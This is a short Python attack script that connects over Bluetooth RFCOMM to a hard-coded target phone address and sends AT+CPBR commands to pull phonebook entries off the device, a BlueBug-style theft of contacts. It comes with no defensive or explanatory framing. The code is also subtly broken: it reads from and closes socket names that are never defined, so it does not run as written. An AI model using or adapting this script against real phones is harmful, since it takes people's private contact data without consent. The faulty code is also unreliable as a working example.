#!/usr/bin/env python3
import bluetooth
#tgtPhone = '18:AF:61:2E:B3:33'
tgtPhone = '14:20:5E:20:43:3F'
port = 17
phoneSock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
phoneSock.connect((tgtPhone, port))
for contact in range(1, 5):
    atCmd = 'AT+CPBR=' + str(contact) + '\n'
    phoneSock.send(atCmd)
    result = client_sock.recv(1024)
    print('[+] ' + str(contact) + ': ' + result)
sock.close()

